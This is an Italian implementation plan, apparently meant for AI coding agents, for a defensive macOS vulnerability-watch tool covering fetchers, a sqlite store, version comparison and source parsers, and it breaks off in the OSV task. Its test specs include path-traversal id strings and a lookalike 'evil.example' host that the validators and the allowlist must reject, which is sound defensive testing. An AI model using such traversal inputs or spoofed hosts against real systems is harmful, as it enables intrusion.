# vulnwatch: piano di implementazione

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** un job giornaliero che:
- scarica i dati sulle vulnerabilità in modo uniforme;
- li confronta in locale con il software di questo Mac;
- applica solo correzioni con audit verde, all'inizio in modalità ombra.

**Architecture:** programma Python fatto di moduli piccoli. Il flusso è:
1. le fonti scaricano senza conoscere l'inventario;
2. tutto finisce in un archivio sqlite;
3. si raccoglie l'inventario locale;
4. confronto e assegnazione della corsia;
5. audit per canale;
6. applicazione da template;
7. report.

Tutto il traffico di rete passa da un unico `Fetcher` con allowlist. Ogni comando è una lista argv costruita da un template fisso. Il codice è installato in una cartella di root, verificata con un manifest, e lanciato da un LaunchAgent.

**Tech Stack:**
- Python 3.9.6 di Apple (`/usr/bin/python3 -I -B`), solo libreria standard: `urllib`, `ssl`, `sqlite3`, `zipfile`, `plistlib`, `fcntl`, `subprocess`;
- `unittest`;
- bash per `install.sh`;
- launchd.

**Spec:** `docs/superpowers/specs/2026-11-03-vulnwatch-design.md`

## Global Constraints

**Python e test**
- Interprete `/usr/bin/python3` con `-I -B`. Nessuna dipendenza esterna, mai `pip install`.
- `vulnwatch.py` inserisce la propria cartella in `sys.path`, perché con `-I` non c'è.
- Test di un file: `/usr/bin/python3 -I -B -m unittest discover -s tests -t . -p '<file>' -v`. Tutti i test: `-p 'test_*.py'`.
- I test non toccano mai la rete né il sistema. Usano `FakeTransport`, `FakeRunner`, fixture e cartelle temporanee.

**Rete e comandi**
- La rete passa solo da `vulnwatch.net.Fetcher`, tranne i comandi `brew`/`npm` eseguiti dai template.
- Solo HTTPS, solo host presenti in `cfg.allowed_hosts` (corrispondenza esatta), CA `/etc/ssl/cert.pem`.
- `subprocess` sempre con lista argv e `timeout`, mai `shell=True`.
- Ogni comando `brew` gira con `BREW_ENV`:

  ```
  HOMEBREW_NO_AUTO_UPDATE=1 HOMEBREW_NO_ANALYTICS=1 HOMEBREW_NO_ENV_HINTS=1
  HOMEBREW_NO_INSTALL_CLEANUP=1 HOMEBREW_NO_AUTOREMOVE=1
  ```

  Fa eccezione solo `BrewClient.update()`, che toglie `HOMEBREW_NO_AUTO_UPDATE` e lancia `brew update`.

**Invarianti dello spec**
- Le funzioni `sync` delle fonti non ricevono l'inventario (I1 per costruzione). Il runner raccoglie l'inventario solo dopo tutte le `sync`.
- Nessun LLM. Mai root a runtime, mai prompt di password, mai chiudere o riavviare app e servizi.
- Il testo esterno passa sempre da `sanitize.clean_text` prima di report e terminale. Non finisce mai in argv né nelle notifiche.
- Testi per l'utente (report, notifiche, CLI) in italiano; identificatori in inglese.

**Valori fissati dallo spec o dalla ricognizione**

| Parametro | Valore |
|---|---|
| Cooldown | 48 h |
| Backfill al primo avvio | 90 giorni |
| Orario del LaunchAgent | ogni giorno alle 07:30 |
| Ecosistemi OSV (fissi) | `npm`, `PyPI` |
| Lista di blocco iniziale | `example-agent`, `@example/cli` |
| Host del redirect di cve.now | `f9gkulwameaj0boi.public.blob.vercel-storage.com` |
| Bottle tag di questa macchina | `arm64_golden_gate` |
| Team ID di Chrome | `EQHXZ8M8AV` |
| Google updater | `~/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater` |
| Cartelle dei lockfile | `~/Code`, `~/Projects`, `~/Projects/example-app` |
| Cartelle protette (mai lette) | `~/Documents`, `~/Desktop`, `~/Downloads` |
| Stato | `~/Library/Application Support/vulnwatch` |
| Log | `~/Library/Logs/vulnwatch` |
| Installazione | `/usr/local/libexec/vulnwatch` |
| Plist | `/Library/LaunchAgents/local.vulnwatch.plist` (label `local.vulnwatch`) |
| Comando | `/usr/local/bin/vulnwatch` |
| Utente | `utente` |

- Nella configurazione consegnata `auto_apply` è `false` (modalità ombra).
- Codici d'uscita della CLI: `0` ok, `2` manomissione sospetta, `3` nessun dato, `4` già in esecuzione.
- Un commit per task, con le righe di attribuzione della sessione.

## Review Focus

1. **Limite di 60 richieste/ora dell'API GitHub** (usata per il cooldown di brew). Una risposta 403 deve dare `unknown` (quindi rosso), mai un crash. Test nel Task 12.
2. **Due esecuzioni insieme** (launchd più `vulnwatch run` lanciato a mano). La seconda deve uscire con "già in esecuzione". Test nei Task 5 e 16.
3. **Versioni strane** (`15.0.0_1`, `v22.23.4`, `157.0.8089.0`, prerelease npm, stringhe illeggibili). Il confronto deve essere corretto, oppure dare `VersionError`, che diventa `unknown`; mai un crash. Test nel Task 3.
4. **Nomi npm con scope o caratteri insoliti** (`@example/cli`, nomi con punti). URL codificato bene e argv validato. Test nei Task 11 e 13.
5. **Una sola fonte giù.** Il run continua, la corsia automatica si spegne per quel giorno e il report lo dice. Test nel Task 16.

---

### Task 1: Verifica degli endpoint e fixture reali

**Files:**
- Create: `vulnwatch/__init__.py` (`VERSION = "0.1.0"`), `tests/__init__.py`
- Create: `docs/endpoints.md`
- Create: `tests/fixtures/{cvenow,kev,cverecord,osv,npm,github,brew}/…`

**Interfaces:**
- Produces: le fixture che usano i task 6, 7, 8, 11, 12 e 13. `docs/endpoints.md` è la fonte di verità per URL e formati. Se un URL o un formato reale è diverso da questo piano, vale quello registrato lì, e i task successivi cambiano la costante relativa.

**Regola per le richieste di questo task:** solo URL generici. Per npm e GitHub si usano pacchetti che non abbiamo installato (`left-pad`, la formula `hello`). User-Agent `vulnwatch/0.1`.

- [ ] **Step 1: crea lo scheletro** (`vulnwatch/__init__.py`, `tests/__init__.py`, `tests/fixtures/`).
- [ ] **Step 2: scarica e riduci le fixture.** Ogni JSON va ridotto a ≤ 3 elementi, mantenendo la struttura.
  - **cve.now:**
    - `https://cve.now/api/v1/entries?filter=critical,kev` → `cvenow/entries_page1.json`. Annota il nome del parametro del cursore: prova `&cursor=<nextCursor>`.
    - `https://cve.now/api/v1/entries/<primo id>` → `cvenow/entry.json`. Annota l'host del redirect.
    - Una voce di ecosistema → `cvenow/entry_ecosystem.json`: il primo `GHSA-*` nelle prime 3 pagine della lista generica. Annota dove stanno ecosistema e nome del pacchetto.
  - **KEV:** `https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json` → `kev/catalog_small.json`.
  - **Record CVE:** `https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/<anno>/<n//1000>xxx/<id>.json` per il primo CVE della lista di cve.now → `cverecord/record.json`. Verifica la regola del bucket.
  - **OSV** (`https://osv-vulnerabilities.storage.googleapis.com`):
    - `curl -sI …/npm/all.zip` e `…/PyPI/all.zip`: annota il `Content-Length`;
    - `…/npm/modified_id.csv`: prime 5 righe → `osv/modified_id_head.csv`; annota formato e ordinamento;
    - un record npm → `osv/record_npm.json`; un record PyPI → `osv/record_pypi.json`;
    - un `MAL-*` dalle prime 200 righe del CSV npm → `osv/record_mal.json`.
  - **npm:** `https://registry.npmjs.org/left-pad` → `npm/packument_leftpad.json`. Tieni `time`, `maintainers`, `_npmUser` e 2 versioni. Annota se esiste `dist.attestations`.
  - **GitHub:** `https://api.github.com/repos/Homebrew/homebrew-core/commits?path=Formula/h/hello.rb&per_page=1` → `github/commits_hello.json`. Annota gli header di rate limit.
  - **Locale** (con `BREW_ENV`):
    - `brew info --json=v2 aom` → `brew/info_formula.json`;
    - `brew info --json=v2 --cask blender` → `brew/info_cask.json`;
    - `brew upgrade --dry-run --formula aom` (stdout+stderr) → `brew/dryrun_aom.txt`;
    - `brew services info --all --json` → `brew/services_info.json`.
- [ ] **Step 3: scrivi `docs/endpoints.md`**, una riga per URL: verificato sì/no, formato, note. Deve rispondere a tutte queste domande:
  - nome del parametro del cursore di cve.now;
  - host del redirect;
  - regola del bucket di cvelistV5;
  - formato e ordinamento di `modified_id.csv`;
  - dimensioni di `all.zip`;
  - percorso del campo data nel JSON dei commit GitHub;
  - campi presenti nel packument;
  - campo `pid` in `services info`.
- [ ] **Step 4: verifica.** `for f in tests/fixtures/**/*.json; do /usr/bin/python3 -I -c 'import json,sys;json.load(open(sys.argv[1]))' "$f" || echo BAD $f; done`. Atteso: nessun `BAD`.
- [ ] **Step 5: commit** (`chore: endpoint verificati e fixture`).

---

### Task 2: Modello, sanitizzazione, configurazione

**Files:**
- Create: `vulnwatch/model.py`, `vulnwatch/sanitize.py`, `vulnwatch/config.py`, `config/config.json`, `config/aliases.json`
- Test: `tests/test_model.py`, `tests/test_sanitize.py`, `tests/test_config.py`

**Interfaces:**
- Produces (`model.py`, tutte dataclass `frozen=True` tranne `Check` e `AuditResult`):
  - `VersionRange(introduced: Optional[str], fixed: Optional[str], last_affected: Optional[str])`
  - `Affected(ecosystem: Optional[str], package: Optional[str], vendor: Optional[str], product: Optional[str], ranges: Tuple[VersionRange, ...], versions: Tuple[str, ...])`
  - `Advisory(id: str, aliases: Tuple[str, ...], source: str, title: str, description: str, cvss: Optional[float], severity: Optional[str], kev: bool, affected: Tuple[Affected, ...], published: Optional[str], modified: Optional[str], malicious: bool)`
    - `source` ∈ `{"cvenow","kev","cverecord","osv"}`; `severity` minuscolo.
  - `InventoryItem(kind: str, name: str, version: str, ecosystem: Optional[str], channel: Optional[str], location: str, team_id: Optional[str] = None, display_name: Optional[str] = None)`
    - `kind` ∈ `{"macos","app","brew_formula","brew_cask","npm_global","runtime","lockfile_pkg"}`.
  - `Finding(id: str, canonical_id: str, item: InventoryItem, match: str, kev_confirmed: bool, critical_confirmed: bool, malicious: bool, range_source: Optional[str], fixed_version: Optional[str], title: str, published: Optional[str], lane: str = "manual", reasons: Tuple[str, ...] = ())`
    - `match` ∈ `{"exact","approximate"}`;
    - `lane` ∈ `{"auto","manual","no_patch","malicious","ignored"}`.
  - `Check(name: str, status: str, detail: str)`, con `status` ∈ `{"pass","fail","unknown","error"}`.
  - `AuditResult(finding_id: str, candidate_version: Optional[str], checks: List[Check], evidence: Dict[str, str])`, con la property `green` = `bool(checks) and all(c.status == "pass" for c in checks)`.
  - `finding_id(canonical_id: str, kind: str, name: str, location: str) -> str`: primi 12 caratteri esadecimali dello sha256 di `"|".join(...)`.
  - `to_dict(obj) -> dict`, `advisory_from_dict(d) -> Advisory`, `finding_from_dict(d) -> Finding`, `audit_from_dict(d) -> AuditResult`. Le tuple devono sopravvivere al round-trip.
- Produces (`sanitize.py`): `clean_text(value: object, max_len: int = 500) -> str`. Regole:
  - `None` → `""`, i non-stringa → `str()`;
  - rimuove sequenze ANSI (`\x1b\[[0-?]*[ -/]*[@-~]` e `\x1b]…\x07`);
  - rimuove i caratteri Unicode di categoria `Cc` (tranne `\t` e `\n`), `Cf` e `Co` (copre bidi e zero-width);
  - `\t` e `\n` diventano spazi; gli spazi multipli si collassano; strip;
  - se il testo supera `max_len`, viene troncato a `max_len - 1` caratteri più `"…"`.
- Produces (`config.py`):
  - `ConfigError(Exception)`;
  - `NpmGlobal(prefix: str, node: str, npm: str)`;
  - `RuntimeSpec(label: str, path: str, product: str)`;
  - `Config`, frozen, con esattamente queste chiavi JSON: `user: str`, `auto_apply: bool`, `cooldown_hours: int`, `backfill_days: int`, `max_records_per_run: int`, `min_request_interval: float`, `allowed_hosts: Tuple[str,...]`, `osv_ecosystems: Tuple[str,...]`, `osv_zip_max_bytes: int`, `hold: Tuple[str,...]`, `app_dirs`, `lockfile_roots`, `protected_dirs`, `venv_roots: Tuple[str,...]`, `lockfile_max_depth: int`, `npm_global: NpmGlobal`, `runtimes: Tuple[RuntimeSpec,...]`, `path_node: str`, `google_updater: str`, `chrome_team_id: str`, `brew: str`, `state_dir: str`, `log_dir: str`, `aliases_file: str`;
  - `load_config(path: str) -> Config`:
    - chiave sconosciuta, mancante o di tipo sbagliato → `ConfigError`;
    - `~` espanso in tutti i campi che sono percorsi;
    - `aliases_file` è relativo alla cartella della configurazione.
- `config/config.json`:
  - valori della tabella in Global Constraints;
  - `allowed_hosts`: `cve.now`, `f9gkulwameaj0boi.public.blob.vercel-storage.com`, `www.cisa.gov`, `raw.githubusercontent.com`, `osv-vulnerabilities.storage.googleapis.com`, `registry.npmjs.org`, `api.github.com`;
  - `max_records_per_run` 3000, `min_request_interval` 0.2, `osv_zip_max_bytes` a 2 × la dimensione misurata nel Task 1;
  - `npm_global`: prefix `~/.npm-global`, con il node e l'npm che lo gestiscono;
  - `path_node`: il `node` primo nel PATH; `brew` `/opt/homebrew/bin/brew`;
  - `venv_roots`: le cartelle dei progetti (più eventuali venv di strumenti);
  - `runtimes` vuoto per ora (lo riempie il Task 8).
- `config/aliases.json`: lista di `{vendor, product, kind, name}`, con vendor e product già normalizzati (vedi Task 10). Voci iniziali:
  - `google/chrome` e `google/chromium` → `app com.google.Chrome`;
  - `apple/macos` → `macos macos`;
  - `nodejs/node js` → `runtime node` e `brew_formula node`;
  - `oven sh/bun` → `runtime bun`;
  - più una voce per i prodotti comuni installabili con brew il cui nome coincide con un prodotto noto (per esempio `curl`, `git`, `openssl@3` → `openssl/openssl`, `ffmpeg`, `postgresql@NN` → `postgresql/postgresql`, `python@3.x`).

- [ ] **Step 1: scrivi i test.**

```python
# test_sanitize.py
assert clean_text("a\x1b[31mb\x1b[0m") == "ab"
assert clean_text("x‮y​z⁦") == "xyz"
assert clean_text("a\tb\nc\x00d") == "a b cd"
assert clean_text(None) == "" and clean_text(9.8) == "9.8"
s = clean_text("x" * 600); assert len(s) == 500 and s.endswith("…")
# test_model.py
assert finding_id("CVE-1", "npm_global", "a", "/p") == finding_id("CVE-1", "npm_global", "a", "/p")
assert len(finding_id("CVE-1", "npm_global", "a", "/p")) == 12
assert finding_id("CVE-1", "npm_global", "a", "/p") != finding_id("CVE-1", "npm_global", "a", "/q")
assert advisory_from_dict(to_dict(adv)) == adv          # adv con ranges, versions e aliases non vuoti
assert finding_from_dict(to_dict(f)) == f
assert audit_from_dict(to_dict(a)).green == a.green
assert AuditResult("x", None, [], {}).green is False
# test_config.py
c = load_config("config/config.json")
assert c.cooldown_hours == 48 and c.auto_apply is False and c.backfill_days == 90
assert c.hold == ("example-agent", "@example/cli") and "cve.now" in c.allowed_hosts
assert all(p.startswith("/Users/") for p in c.lockfile_roots)
# chiave in più, chiave mancante, "cooldown_hours": "48" -> ConfigError (tre test)
```

- [ ] **Step 2: esegui i test** (`-p 'test_sanitize.py'` ecc.). Atteso: FAIL (moduli mancanti).
- [ ] **Step 3: implementa** `model.py`, `sanitize.py`, `config.py` e i due JSON con le firme sopra.
- [ ] **Step 4: esegui i test.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: modello, sanitizzazione, configurazione`).

---

### Task 3: Versioni e intervalli

**Files:**
- Create: `vulnwatch/versions.py`
- Test: `tests/test_versions.py`

**Interfaces:**
- Consumes: `VersionRange`.
- Produces:
  - `VersionError(ValueError)`;
  - `compare(a: str, b: str, scheme: str) -> int` (−1/0/1), con `scheme` ∈ `{"semver","pep440","generic"}`;
  - `major(v: str, scheme: str) -> int`;
  - `scheme_for(kind: str, ecosystem: Optional[str]) -> str`: npm → `semver`, PyPI → `pep440`, tutto il resto → `generic`;
  - `affected_by(version: str, ranges: Sequence[VersionRange], versions: Sequence[str], scheme: str) -> Optional[bool]`;
  - `fixed_for(version: str, ranges: Sequence[VersionRange], scheme: str) -> Optional[str]`;
  - `npm_satisfies(version: str, expr: str) -> bool`.

**Regole:**
- **Intervallo:** contiene `v` se valgono tutte e tre le condizioni:
  - `introduced` ∈ (`None`, `"0"`, `"*"`) oppure `v ≥ introduced`;
  - `fixed is None` oppure `v < fixed`;
  - `last_affected is None` oppure `v ≤ last_affected`.
- **`affected_by`:**
  - `True` se `version` è nelle versioni esplicite o in un intervallo;
  - `None` se non ci sono né intervalli né versioni, oppure se un confronto solleva `VersionError`;
  - altrimenti `False`.
- **`fixed_for`:** restituisce il `fixed` del primo intervallo che contiene la versione.
- **Schema `generic`:**
  - toglie la `v` iniziale e divide in token con `re.findall(r"\d+|[A-Za-z]+")`;
  - confronto token per token: numeri come interi, lettere in minuscolo e in ordine lessicografico, un numero vale più di una parola;
  - se una lista finisce prima: la più lunga è maggiore se il token in più è un numero, minore se è una parola (prerelease);
  - nessun token → `VersionError`.
- **Schema `semver`:** `MAJOR.MINOR.PATCH[-pre][+build]` con `v` iniziale opzionale. Il build si ignora. Prerelease secondo semver 2.0.
- **Schema `pep440`:** epoch `N!`, release `N(.N)*`, `a|b|rc` N, `.postN`, `.devN`. Ordine: dev < a < b < rc < finale < post.
- **`npm_satisfies`:**
  - supporta `||`, AND separati da spazio, `> >= < <= =`, `^`, `~`, x-range (`1.x`, `1.2.*`, `*`) e intervalli con trattino `A - B`;
  - qualsiasi altra sintassi (`workspace:`, `npm:`, URL) → `VersionError`.

- [ ] **Step 1: scrivi i test.**

```python
VR = VersionRange
assert compare("157.0.8089.0", "156.0.8078.80", "generic") == 1
assert compare("15.0.0_1", "15.0.0", "generic") == 1
assert compare("v22.23.4", "22.23.4", "generic") == 0
assert compare("1.0beta", "1.0", "generic") == -1
assert compare("1.2.3-rc.1", "1.2.3", "semver") == -1 and compare("1.2.10", "1.2.9", "semver") == 1
assert compare("1.2.3+abc", "1.2.3", "semver") == 0
assert compare("2.0rc1", "2.0", "pep440") == -1 and compare("2.0.post1", "2.0", "pep440") == 1
assert compare("1!1.0", "2.0", "pep440") == 1 and compare("2.0.dev1", "2.0a1", "pep440") == -1
for bad in ("", "abc"):
    with self.assertRaises(VersionError): compare(bad, "1.0.0", "semver")
assert affected_by("1.4.0", [VR("0", "1.5.0", None)], [], "semver") is True
assert affected_by("1.5.0", [VR("0", "1.5.0", None)], [], "semver") is False
assert affected_by("0.9.2.6", [VR(None, None, "0.9.2.6")], [], "generic") is True
assert affected_by("0.9.2.8", [VR(None, None, "0.9.2.6")], [], "generic") is False
assert affected_by("1.0.1", [], ["1.0.1"], "semver") is True
assert affected_by("1.0", [], [], "generic") is None
assert affected_by("garbage!!", [VR("0", "2.0.0", None)], [], "semver") is None
rs = [VR("0", "1.5.0", None), VR("2.0.0", "2.1.0", None)]
assert fixed_for("1.4.0", rs, "semver") == "1.5.0" and fixed_for("2.0.5", rs, "semver") == "2.1.0"
assert npm_satisfies("22.23.4", ">=20") is True
assert npm_satisfies("22.23.4", ">=24.22.1 <25 || >=26.12.1") is False
assert npm_satisfies("24.22.1", ">=24.22.1 <25 || >=26.12.1") is True
assert npm_satisfies("18.0.5", "~18.0.0") is True and npm_satisfies("18.1.0", "~18.0.0") is False
assert npm_satisfies("1.2.3", "1.x") is True and npm_satisfies("1.2.3", "1.0.0 - 1.2.0") is False
with self.assertRaises(VersionError): npm_satisfies("1.0.0", "workspace:*")
assert major("15.0.0_1", "generic") == 15 and major("v22.23.4", "semver") == 22
```

- [ ] **Step 2: esegui** `-p 'test_versions.py'`. Atteso: FAIL.
- [ ] **Step 3: implementa** `versions.py`.
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: confronto versioni e intervalli`).

---

### Task 4: Rete (`Fetcher`)

**Files:**
- Create: `vulnwatch/net.py`
- Test: `tests/test_net.py`

**Interfaces:**
- Produces:
  - `FetchError(Exception)`, con attributo `status: Optional[int]`;
  - `Response(status: int, headers: Dict[str, str], body: bytes)` (header in minuscolo);
  - `Transport` (Protocol):
    - `open(url, headers, timeout, max_bytes) -> Response`: non segue i redirect; dimensione oltre `max_bytes` → `FetchError`;
    - `download(url, headers, timeout, max_bytes, dest_path) -> Response`: scrive a blocchi nel file;
  - `UrllibTransport()`: `ssl.create_default_context(cafile="/etc/ssl/cert.pem")`, redirect disattivati;
  - `FakeTransport(routes: Dict[str, Union[Response, Exception]])`, con attributi `opened: List[str]` e `opened_headers: List[Dict[str, str]]`. Applica anche `max_bytes`. Una URL senza route → `FetchError(status=404)`;
  - `Fetcher(transport, allowed_hosts, user_agent="vulnwatch/0.1", timeout=30.0, max_bytes=50_000_000, min_interval=0.2, sleep=time.sleep, clock=time.monotonic)`, con questi metodi:
    - `get(url, max_bytes=None, headers=None) -> bytes`;
    - `get_json(...) -> Any`;
    - `download(url, dest_path, max_bytes) -> int`;
    - attributo `request_log: List[str]`, con ogni URL aperta in ordine, compresi i salti di redirect.

**Regole:**
- Solo `https`, e l'host deve stare esattamente in `allowed_hosts`. La verifica avviene prima di aprire.
- Si seguono al massimo 3 redirect (301, 302, 303, 307, 308), risolti con `urljoin`. Ogni destinazione viene rivalidata.
- Uno stato diverso da 200 → `FetchError(status=…)`. JSON non valido → `FetchError`.
- Tra due richieste allo stesso host passano almeno `min_interval` secondi.

- [ ] **Step 1: scrivi i test.**

```python
A, B = "https://cve.now/a", "https://f9gkulwameaj0boi.public.blob.vercel-storage.com/b"
# http -> FetchError e request_log == []; host non in lista -> FetchError e transport.opened == []
# "https://cve.now.evil.example/" con allowed {"cve.now"} -> FetchError
# A -> 302 location B -> 200 b"ok": get(A) == b"ok" e request_log == [A, B]
# redirect verso host non in lista -> FetchError e request_log == [A]
# 4 redirect in catena -> FetchError
# 404 -> FetchError; 403 -> FetchError con .status == 403
# body di 11 byte con max_bytes=10 -> FetchError
# get_json su b"{" -> FetchError
# opened_headers[0]["User-Agent"] == "vulnwatch/0.1"
# due get sullo stesso host con clock finto fermo -> sleep chiamato con 0.2
```

- [ ] **Step 2: esegui** `-p 'test_net.py'`. Atteso: FAIL.
- [ ] **Step 3: implementa** `net.py`.
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: fetcher con allowlist`).

---

### Task 5: Archivio e lock di esecuzione

**Files:**
- Create: `vulnwatch/store.py`
- Test: `tests/test_store.py`

**Interfaces:**
- Consumes: `model` (dataclass e `to_dict`/`*_from_dict`).
- Produces `Store(path: str)`, sqlite, che crea lo schema se manca. Tabelle:
  - `advisories(source, id, doc, fetched_at, PK(source,id))`
  - `cursors(name PK, value)`
  - `pending(kind, key, seq, PK(kind,key))`
  - `runs(run_id PK, started_at, finished_at, status, summary)`
  - `findings(run_id, finding_id, doc)`
  - `audits(run_id, finding_id, doc)`
  - `ignores(finding_id PK, reason, created_at)`
- Metodi di `Store`:
  - `put_advisory(adv, fetched_at: str)`;
  - `get_advisory(source, id) -> Optional[Advisory]`;
  - `has_advisory(source, id) -> bool`;
  - `advisories(source: Optional[str] = None) -> Iterator[Advisory]`;
  - `get_cursor(name) -> Optional[str]`, `set_cursor(name, value)`;
  - `queue(kind, key)`, idempotente, mantiene l'ordine di inserimento;
  - `pending(kind, limit) -> List[str]`, `done(kind, key)`;
  - `start_run(started_at) -> str`, `finish_run(run_id, status, summary: dict)`;
  - `save_findings(run_id, findings, audits: Dict[str, AuditResult])`;
  - `latest_findings() -> Tuple[Optional[str], List[Finding], Dict[str, AuditResult]]`, dall'ultimo run con stato `ok` o `partial`;
  - `find(finding_id) -> Optional[Finding]`, dall'ultimo run;
  - `add_ignore(finding_id, reason, created_at)`, `ignores() -> Dict[str, str]`;
  - `close()`.
- Produces anche:
  - `AlreadyRunning(Exception)`;
  - `RunLock(path)`: context manager con `fcntl.flock(LOCK_EX | LOCK_NB)`; se il lock è già preso → `AlreadyRunning`.

- [ ] **Step 1: scrivi i test.**

```python
# upsert: put_advisory due volte con titolo diverso -> get_advisory restituisce il secondo
# set_cursor("x","1"); get_cursor("x") == "1"; get_cursor("y") is None
s.queue("cverecord","a"); s.queue("cverecord","b"); s.queue("cverecord","c"); s.queue("cverecord","a")
assert s.pending("cverecord", 2) == ["a", "b"]; s.done("cverecord", "a")
assert s.pending("cverecord", 10) == ["b", "c"]
# due run salvati -> latest_findings() restituisce quelli del secondo
# add_ignore("abc","non installato in produzione") -> ignores() == {"abc": "non installato in produzione"}
with RunLock(p):
    with self.assertRaises(AlreadyRunning): RunLock(p).__enter__()
# file con byte casuali al posto del db -> Store(path) solleva sqlite3.DatabaseError
```

- [ ] **Step 2: esegui** `-p 'test_store.py'`. Atteso: FAIL.
- [ ] **Step 3: implementa** `store.py`.
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: archivio sqlite e lock`).

---

### Task 6: Fonti KEV, record CVE, cve.now

**Files:**
- Create: `vulnwatch/sources/__init__.py`, `vulnwatch/sources/kev.py`, `vulnwatch/sources/cverecord.py`, `vulnwatch/sources/cvenow.py`
- Test: `tests/test_sources_kev.py`, `tests/test_sources_cverecord.py`, `tests/test_sources_cvenow.py`

**Interfaces:**
- Consumes: `Fetcher`, `Store`, `model`, le fixture del Task 1 e le costanti di `docs/endpoints.md`.
- Produces (`sources/__init__.py`): `SyncStats(source: str, fetched: int, stored: int, errors: List[str])`.
- **Regola per tutte le fonti (T7):**
  - ogni `parse_*` su un documento di forma inattesa (chiave mancante, tipo sbagliato) solleva `ValueError`;
  - `sync` conta l'errore e prosegue con la voce successiva, senza mai interrompere tutta la fonte per una voce malformata.
- **Scelta per cve.now:** la lista paginata `/api/v1/entries?filter=critical,kev` copre sia `kev` sia `critical` e ha un cursore. Per questo sostituisce i due feed `/feed?filter=…` citati nello spec.

**`kev.py`**
- `KEV_URL`, `parse_catalog(doc) -> List[Advisory]`.
- Ogni voce diventa un `Advisory` con:
  - `source="kev"`, `id=cveID`, `kev=True`, `published=dateAdded`;
  - `affected=(Affected(None, None, vendorProject, product, (), ()),)`.
- `sync(fetcher, store, now) -> SyncStats`: scarica il catalogo completo, salva tutto e mette in coda `("cverecord", cveID)` per ogni CVE che non ha ancora un record.

**`cverecord.py`**
- `record_url(cve_id) -> str`:
  - accetta solo id che rispettano `^CVE-\d{4}-\d{4,}$`, altrimenti `ValueError`;
  - il bucket è `f"{n // 1000}xxx"`.
- `parse_record(doc) -> Advisory`, con `source="cverecord"`:
  - `cvss` è il `baseScore` massimo tra `containers.cna.metrics[*]` e `containers.adp[*].metrics[*]`, considerando le chiavi `cvssV4_0`, `cvssV3_1`, `cvssV3_0`;
  - `severity="critical"` se `cvss ≥ 9.0`.
- `affected` viene da `cna.affected[]` (vendor e product), considerando solo le voci di `versions` con `status == "affected"`:
  - con `lessThan` → `VersionRange(introduced=version, fixed=lessThan, …)`. `introduced` diventa `None` se `version` ∈ {`"0"`, `"*"`, `"unspecified"`, `"n/a"`, `""`}; `fixed` diventa `None` se `lessThan == "*"`;
  - con `lessThanOrEqual` → `last_affected`;
  - senza nessuno dei due → la versione va nella lista esplicita, salvo i segnaposto.
- `sync(fetcher, store, now, limit) -> SyncStats`: elabora `store.pending("cverecord", limit)`.
  - Un 404 viene contato tra gli errori e marcato `done`.
  - Gli altri errori lasciano la voce in coda per il giorno dopo.

**`cvenow.py`**
- `LIST_URL = "https://cve.now/api/v1/entries?filter=critical,kev"`.
- `detail_url(id) -> str`: accetta solo id del tipo `^(CVE-\d{4}-\d{4,}|GHSA(-[0-9a-z]{4}){3}|[A-Z]{2,10}-[0-9A-Za-z._-]{1,64})$`, altrimenti `ValueError`.
- `parse_entry(doc) -> Advisory`, con `source="cvenow"`:
  - `title` dal titolo; `description` da `summary.text`, oppure `originalDescription`;
  - `cvss` da `severity.cvss`;
  - `kev=bool(exploitation.kev)`;
  - `affected` dai campi vendor, product e ranges (`introduced`, `fixed`, `lastAffected`), più ecosistema e pacchetto se presenti, con i nomi registrati in `endpoints.md`.
- `sync(fetcher, store, now, backfill_days, limit) -> SyncStats`:
  1. Scorre le pagine della lista, al massimo 200.
  2. Si ferma alla prima voce con `firstSeenAt ≤` del cursore `cvenow_since`. Al primo avvio il limite è `now - backfill_days`.
  3. Mette in coda `("cvenow", id)` ogni id nuovo, nell'ordine della lista.
  4. Scarica il dettaglio di `store.pending("cvenow", limit)` e lo salva.
  5. Mette in coda `("cverecord", …)` ogni CVE presente nell'id o negli alias.
  6. Aggiorna `cvenow_since` al `firstSeenAt` più recente, ma solo se la lista è stata letta per intero.

- [ ] **Step 1: scrivi i test.**

```python
# kev: parse_catalog(fixture) -> tutte kev True; vendor e product dalla fixture
# kev.sync con FakeTransport -> store.pending("cverecord", 10) contiene gli id della fixture
assert record_url("CVE-2026-120534").endswith("/cves/2026/120xxx/CVE-2026-120534.json")
assert record_url("CVE-2024-0001").endswith("/cves/2024/0xxx/CVE-2024-0001.json")
with self.assertRaises(ValueError): record_url("CVE-2026-1/../../x")
# parse_record su un doc sintetico con versions = [{"version":"0","lessThan":"2.0","status":"affected"},
#   {"version":"3.1","status":"affected"},{"version":"unspecified","lessThanOrEqual":"4.0","status":"affected"},
#   {"version":"5.0","status":"unaffected"}]
# -> ranges == (VR(None,"2.0",None), VR(None,None,"4.0")) e versions == ("3.1",)
# cna cvssV3_1 7.5 + adp cvssV3_1 9.8 -> cvss 9.8 e severity "critical"
# cvenow: parse_entry(fixture) -> id, vendor, product e ranges come nella fixture; kev False se exploitation.kev è null
with self.assertRaises(ValueError): detail_url("../x")
# sync uniforme: lista in 2 pagine con 3 id -> request_log == [p1, p2, d1(+redirect), d2(+redirect), d3(+redirect)]
# sync con cursore: le voci con firstSeenAt <= cursore non vengono scaricate
```

- [ ] **Step 2: esegui** i tre file. Atteso: FAIL.
- [ ] **Step 3: implementa** i tre moduli.
- [ ] **Step 4: esegui.** Atteso: PASS.
- [ ] **Step 5: commit** (`feat: fonti KEV, record CVE, cve.now`).

---

### Task 7: Fonte OSV

**Files:**
- Create: `vulnwatch/sources/osv.py`
- Test: `tests/test_sources_osv.py`

**Interfaces:**
- Consumes: `Fetcher` (`get`, `download`), `Store`, `SyncStats`.
- Produces: `OSV_BASE`, `parse_osv(doc) -> Advisory`, `sync(fetcher, store, now, ecosystems, tmp_dir, limit, zip_max_bytes) -> SyncStats`.
- Vale la regola del Task 6: un documento malformato dà `ValueError`, si conta come errore e si va avanti.

**`parse_osv`**
- Per ogni elemento di `affected[]`: `ecosystem` e `package` da `package.ecosystem` e `package.name`.
